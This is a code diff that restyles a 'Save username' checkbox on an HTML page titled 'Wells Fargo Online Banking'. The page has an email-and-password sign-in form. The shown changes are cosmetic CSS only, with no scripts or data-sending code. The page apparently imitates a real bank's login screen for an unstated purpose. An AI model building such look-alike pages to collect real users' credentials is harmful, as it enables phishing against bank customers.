@@ -6,6 +6,16 @@
   <title>Wells Fargo Online Banking</title>
   <link rel="icon" href="logo.png" type="image/png" />
   <style>
+    .save-username {
+  display: flex;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+.save-username input[type="checkbox"] {
+  margin-right: 8px;
+  transform: scale(1.2);
+}
     body {
       font-family: Arial, sans-serif;
       background-color: #f8f9fa;
@@ -150,10 +160,10 @@
     <form id="login-form">
       <input type="email" id="email" placeholder="Username or email" required />
       <input type="password" id="password" placeholder="Password" required />
-      <div style="display:flex; align-items:center; margin-bottom:15px;">
-        <input type="checkbox" id="save-username" style="margin-right:8px;"/>
-        <label for="save-username">Save username</label>
-      </div>
+      <div style="display:flex; align-items:center; margin-bottom:20px;">
+  <input type="checkbox" id="save-username" style="margin-right:8px; transform: scale(1.2);" />
+  <label for="save-username" style="font-size:16px; cursor:pointer;">Save username</label>
+</div>
       <button type="submit">Sign In</button>
       <div class="form-links">
         <a href="#">Forgot password?</a> |
